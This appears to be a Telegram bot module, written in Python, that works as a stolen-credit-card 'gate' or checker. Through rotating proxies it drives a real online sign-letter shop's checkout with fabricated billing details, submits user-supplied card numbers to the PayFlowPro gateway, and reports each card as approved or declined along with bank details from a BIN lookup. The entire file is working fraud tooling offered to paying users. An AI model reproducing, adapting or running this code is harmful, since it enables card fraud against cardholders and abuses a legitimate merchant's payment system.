# Gate made by @ByDog3r
# Site hunted by @TNT

import requests as r
import string, random, re, time
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode
from src.extras.checklib import MakeGate, ScrapInfo


BIN_API = "https://bins.antipublic.cc/bins/"


@Client.on_message(filters.command(["payflow_charge", "pc"], ["/", ",", ".", ";", "-"]))
async def jaico(client: Client, m: Message):
    card = m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    msg = await m.reply("checking...", quote=True)
    cc_check = await get_live(card, msg)

def load_proxies(filename):
    with open(filename, 'r') as file:
        proxies = [{'http': line.strip()} for line in file if line.strip()]
    return proxies

def getIndex(response):
    with open("index.html", "w", encoding="utf-8") as f:
        f.write(response.text)

def getStr(text:str, a:str, b:str) -> str:
    return text.split(a)[1].split(b)[0]

def email_generator():
    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'example.com']
    longitud = random.randint(8, 12)
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(dominio)
    return correo

def open_files(file):
    with open(file, 'r') as f: return [line.strip() for line in f]


async def get_live(card, msg):
    card_splited = makeGate.split_card(card)
    ccn = card_splited[0]
    month = card_splited[1]
    year = card_splited[2]
    cvv = card_splited[3]

    if ccn[0] == '4':
        card_type = "Visa"
    elif ccn[0] == '5':
        card_type = 'MasterCard'
    elif ccn[0] == '3':
        card_type = "Amex"

    session = r.Session()
    proxies = load_proxies("src/extras/proxies.txt")
    proxy = random.choice(proxies)

# ========= Getting the first site ===============

    try:

        initial_time = time.time()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-AR,es;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://www.buysignletters.com/en/',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

        response = session.get('https://www.buysignletters.com/en/aluminum-letters-numbers', headers=headers, proxies=proxy)

        current_time = datetime.now().strftime("%D - %H:%M:%S")

        msgg = f"""<b>{current_time}</b>
━━━━━━━━━━━
<b>CC:</b> {ccn}:{month}:{year}:{cvv}
<b>Status:</b> Checking...
"""

        await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

# ========= Second req ===============

        headers = {
            'accept': '*/*',
            'accept-language': 'es-AR,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.buysignletters.com',
            'priority': 'u=1, i',
            'referer': 'https://www.buysignletters.com/en/aluminum-letters-numbers',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
}

        params = {
            'signString': 'qqq',
            'sign_design_preview': 'False',
            'dimension': '0.91',
}

        data = {
            'product_attribute_163105_394_597591': '10777382',
            'product_attribute_163105_395_597590': '10777381',
            'product_attribute_163105_393_597592': '10777390',
            'signLetter': 'qqq',
}

        response = session.post(
            'https://www.buysignletters.com/addproducttocart/details/163105/1',
            params=params,
            headers=headers,
            data=data,
            proxies=proxy
)

        #await msg.edit_text("2", parse_mode=ParseMode.MARKDOWN)

# ========= Third reque ===============

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-AR,es;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://www.buysignletters.com/en/aluminum-letters-numbers',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}
        response = session.get('https://www.buysignletters.com/cart', headers=headers, proxies=proxy)

# ============ Fourth req ===========

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-AR,es;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryuzBVYrqQxfiFX1CJ',
            'origin': 'https://www.buysignletters.com',
            'priority': 'u=0, i',
            'referer': 'https://www.buysignletters.com/en/cart',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

        files = {
            'itemquantity143285': (None, '1'),
            'itemquantity143286': (None, '1'),
            'IsPreview': (None, 'False'),
            'Comments': (None, ''),
            'checkout': (None, ' '),
            'discountcouponcode': (None, ''),
            'giftcardcouponcode': (None, ''),
            'CountryId': (None, '0'),
            'StateProvinceId': (None, '0'),
            'ZipPostalCode': (None, ''),
}

        response = session.post('https://www.buysignletters.com/en/cart', headers=headers, files=files, proxies=proxy)

        #await msg.edit_text("3", parse_mode=ParseMode.MARKDOWN)

# =========== Fifth Req ============

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-AR,es;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://www.buysignletters.com/en/login/checkoutasguest?returnUrl=%2Fen%2Fcart',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}

        response = session.get('https://www.buysignletters.com/en/checkout', headers=headers, proxies=proxy)

        #await msg.edit_text("4", parse_mode=ParseMode.MARKDOWN)

# ============= Filling out checkout ===========

        headers = {
            'accept': '*/*',
            'accept-language': 'es-AR,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.buysignletters.com',
            'priority': 'u=1, i',
            'referer': 'https://www.buysignletters.com/en/onepagecheckout',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
}

        data = {
            'countryId': '1',
}

        response = session.post(
            'https://www.buysignletters.com/checkout/GetShippingMethodInfo/',
            headers=headers,
            data=data,
            proxies=proxy
)

        #await msg.edit_text("5", parse_mode=ParseMode.MARKDOWN)


        email = email_generator()

        headers = {
            'accept': '*/*',
            'accept-language': 'es-AR,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.buysignletters.com',
            'priority': 'u=1, i',
            'referer': 'https://www.buysignletters.com/en/onepagecheckout',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
}

        data = {
            'BillingNewAddress.Id': '0',
            'BillingNewAddress.FirstName': 'Leonel',
            'BillingNewAddress.LastName': 'Molina',
            'BillingNewAddress.Company': 'Quack.Inc',
            'BillingNewAddress.Address1': '547 Philadelphia St',
            'BillingNewAddress.Address2': '',
            'BillingNewAddress.City': 'Indiana',
            'BillingNewAddress.StateProvinceId': '48',
            'BillingNewAddress.CountryId': '1',
            'BillingNewAddress.ZipPostalCode': '15701',
            'BillingNewAddress.Email': email,
            'BillingNewAddress.PhoneNumber': '8478247824',
            'ship_to_same_address': 'on',
}

        response = session.post('https://www.buysignletters.com/checkout/OneSaveBilling/', headers=headers, data=data, proxies=proxy)

        #await msg.edit_text("6", parse_mode=ParseMode.MARKDOWN)


        headers = {
            'accept': '*/*',
            'accept-language': 'es-AR,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.buysignletters.com',
            'priority': 'u=1, i',
            'referer': 'https://www.buysignletters.com/en/onepagecheckout',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
}

        data = 'shippingoption=.USA+Only+Free+Ground+Shipping+(Orders+over+%24100.)___Shipping.FixedRate'

        response = session.post(
            'https://www.buysignletters.com/checkout/OneSaveShippingMethod/',
            headers=headers,
            data=data,
            proxies=proxy
)


        headers = {
            'accept': '*/*',
            'accept-language': 'es-AR,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.buysignletters.com',
            'priority': 'u=1, i',
            'referer': 'https://www.buysignletters.com/en/onepagecheckout',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
}

        data = {
            'paymentmethod': 'Payments.PayFlowPro',
        }

        response = session.post(
            'https://www.buysignletters.com/checkout/OneSavePaymentMethod/',
            headers=headers,
            data=data,
            proxies=proxy
)

        #await msg.edit_text("7", parse_mode=ParseMode.MARKDOWN)

        headers = {
            'accept': '*/*',
            'accept-language': 'es-AR,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.buysignletters.com',
            'priority': 'u=1, i',
            'referer': 'https://www.buysignletters.com/en/onepagecheckout',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
}

        data = {
            'CreditCardType': card_type,
            'CardholderName': 'Leonel Johnsom',
            'CardNumber': ccn,
            'ExpireMonth': month,
            'ExpireYear': year,
            'CardCode': cvv,
}

        response = session.post(
            'https://www.buysignletters.com/checkout/OneSavePaymentInfo/',
            headers=headers,
            data=data,
            proxies=proxy
)



# ============== Complete trx ===========

        headers = {
            'accept': '*/*',
            'accept-language': 'es-AR,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.buysignletters.com',
            'priority': 'u=1, i',
            'referer': 'https://www.buysignletters.com/en/onepagecheckout',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
}

        data = {
            'Comment': '',
}

        response = session.post('https://www.buysignletters.com/checkout/OneConfirmOrder/', headers=headers, data=data, proxies=proxy)
        card_response = getStr(response.text, 'Response Description :', "u003c/li").replace("\\", '')
        BIN = ccn[0:6]
        data = r.get(BIN_API+BIN).json()
        final_time = time.time() - initial_time

        if "CVV2" in card_response:
            mssg = f"""<b>#Payflow_Charged ($pc) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: Approved ✅<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {card_response}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: 60$ CHARGED</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}""" # to check proxy add <a href="https://t.me/ByDog3r">⊁</a> <b>Proxy</b> :{proxy['http']} ✅
        else:
            mssg = f"""<b>#Payflow_Charged ($pc) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: DECLINED ❌<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {card_response}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: 60$ CHARGED</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}""" # to check proxy add <a href="https://t.me/ByDog3r">⊁</a> <b>Proxy</b> :{proxy['http']} ✅

        await msg.edit_text(mssg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
        session.cookies.clear()
        session.close()

    except Exception as e:
        print(e)
        await msg.edit_text("There is an error with the proxy. Please try again.", parse_mode=ParseMode.MARKDOWN)
